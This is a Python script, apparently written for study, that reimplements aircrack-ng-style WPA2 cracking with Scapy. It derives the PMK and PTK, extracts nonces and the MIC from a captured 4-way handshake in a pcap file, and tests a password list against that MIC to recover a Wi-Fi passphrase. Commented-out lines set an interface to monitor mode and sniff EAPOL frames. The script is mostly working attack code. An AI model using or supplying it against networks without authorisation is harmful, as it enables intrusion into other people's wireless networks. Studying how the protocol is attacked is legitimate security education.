# Author Franz Gastring
# Reimplementando as fetrramentas airodump-ng, airreplay-ng e o aircrack-ng para WPA2 
# Algoritmo para estudo didatico do modulo Scapy

# Creditos a este blog que serviu como base para a implementar
# https://nicholastsmith.wordpress.com/2016/11/15/wpa2-key-derivation-with-anaconda-python/
from scapy.all import *
from threading import Thread

import os # responsavel por chamar comandos do sistema
import time # para usar delay e timestamp 
import hmac
from binascii import a2b_hex, b2a_hex
from hashlib import pbkdf2_hmac, sha1, md5
 
#Pseudo-random function (PTK)
#key:       PMK
#A:         b'Pairwise key expansion'
#B:         The apMac, cliMac, aNonce, and sNonce concatenated
#return:    The ptk
def PRF(key, A, B):
    # PTK contem 64 bytes
    nByte = 64
    i = 0
    R = b''
    # Cada iteracao produz 160-bit e precisamos de 512 bits 
    while(i <= ((nByte * 8 + 159) / 160)):
        hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), sha1)
        R = R + hmacsha1.digest()
        i += 1
    return R[0:nByte]
 
 
#Compute the 1st message integrity check for a WPA 4-way handshake
#pwd:       The password to test
#ssid:      The ssid of the AP
#A:         b'Pairwise key expansion'
#B:         The apMac, cliMac, aNonce, and sNonce concatenated
#           like mac1 mac2 nonce1 nonce2
#           such that mac1 < mac2 and nonce1 < nonce2
#data:      A list of 802.1x frames with the MIC field zeroed
#return:    (x, y, z) where x is the mic, y is the PTK, and z is the PMK

def MakeMIC(pwd, ssid, A, B, data, wpa = False):


    #Create the pairwise master key using 4096 iterations of hmac-sha1
    #to generate a 32 byte value
    pmk = pbkdf2_hmac('sha1', pwd.encode('ascii'), ssid.encode('ascii'), 4096, 32)
    #Make the pairwise transient key (PTK)
    ptk = PRF(pmk, A, B)
    #WPA uses md5 to compute the MIC while WPA2 uses sha1
    hmacFunc = md5 if wpa else sha1
    #Create the MICs using HMAC-SHA1 of data and return all computed values
    mics = [hmac.new(ptk[0:16], i, hmacFunc).digest() for i in data]
    return (mics, ptk, pmk)


def WpaCrack(S, ssid, aNonce, sNonce, apMac, cliMac, data, targMic):
    # ordering the generation of A and B
    def MakeAB(aNonce, sNonce, MAC_AP, MAC_ST):
        A = b"Pairwise key expansion"
        B = min(MAC_AP, MAC_ST) + max(MAC_AP, MAC_ST) + min(aNonce, sNonce) + max(aNonce, sNonce)
        return (A, B)

    A, B = MakeAB(aNonce, sNonce, apMac, cliMac)
    for i in S:
        print('Testando:\t\t'+ i)
        mic, _, _ = MakeMIC(i, ssid, A, B, [data])
        v = b2a_hex(mic[0]).decode()[:-8]
        
        print('Desired MIC1:\t\t' + targMic)
        print('Computed MIC1:\t\t' + v)
        
        if(v != targMic):
            continue

        print('##########################################')
        print('####### Found Password: '+ i + ' #########')
        print('##########################################')

    return None

def change_channel():
	# canal de inicio
	ch = 11

	while True:
		# linux iwconfig 
		# os.system(f"iwconfig {interface} channel {ch}")
		
		# troca os canais (1-14)
		ch = ch % 14 + 1
		# espera 300ms para trocar o canal
		time.sleep(0.3)

if __name__ == "__main__":

	# interface utilizada 
	# (importante HW aceitar o modo monitor)
	interface = "wlx00c0ca4ab15c"

	# inicia o modo monitor
	# os.system(f"ifconfig %s down", interface)
	# os.system(f"iwconfig %s mode monitor", interface)
	# os.system(f"ifconfig %s up", interface)

	# inicia a funcao que troca os canais para varrer todos os canais

	# channel_changer = Thread(target=change_channel)
	# channel_changer.daemon = True
	# channel_changer.start()

	#Read a file of passwords containing
	# with open('passwd.txt') as f:
	#     S = []
	#     for l in f:
	#         S.append(l.strip())

	S = ["aloha","senha errada","outra senha"]

	# sniffing a handshake
	# caso ainda nao o tenha capturado
	# res = sniff(filter="ether proto 0x888e", count=4, iface=interface)
	# caso ja
	res = rdpcap('filtered.pcap')

	zeros = '00000000000000000000000000000000'

	# ############### Pacote n1 (AP Nonce) ####################
	
	data_1 = b2a_hex(str(res[0][EAPOL]))

	# Extrai o AP Nonce gerado pelo Autenticador
	aNonce = a2b_hex(data_1[34:98])
	
	# ############### Pacote n2 (ST Nonce, MIC) ###############
	
	data_2 = b2a_hex(str(res[1][EAPOL]))
	
	# Extrai o S Nonce gerado pelo Suplicant (Cliente)
	sNonce = a2b_hex(data_2[34:98])

	# Extrai o MIC 
	Mic_1 = data_2[162:194]

	# Remove o Mic do pacote 802.11 para comparar 
	data_2z = data_2[:162] + zeros + data_2[194:]
	data_2z = a2b_hex(data_2z)

	# ############### Informacoes da rede - WLAN ###############
	ESSID = "ALHN-42CC"
	ESSID = raw_input("Digite o ESSID: ")

	# NAO IMPLEMENTADO AINDA - RETIRAR DO BEACON O VALOR ESSID
	# #######################################################3333
	# recebe 10 Probe Repsonse para descobrir ESSID
	# ESSID = res2[0][Dot11Elt].info

	# indica flag MIC not Set
	# res[0][EAPOL][Raw].load[1:3] == '\x00\x8a'
	
	# MAC do roteador AP
	# MAC_AP = res[0][Dot11].addr3
	# #######################################################3333

	print("Informe os valores no formato hex aabbccddeeff, por exemplo")
	print("Dica: no wireshark utilize a opcao: copy as hex stream")

	MAC_AP = raw_input("Digite o MAC do Acess Point: ")
	MAC_ST = raw_input("Digite o MAC do Station: ")

	MAC_AP = a2b_hex(MAC_AP)
	MAC_ST = a2b_hex(MAC_ST)

	WpaCrack(S, ESSID, aNonce, sNonce, MAC_AP, MAC_ST, data_2z, Mic_1)

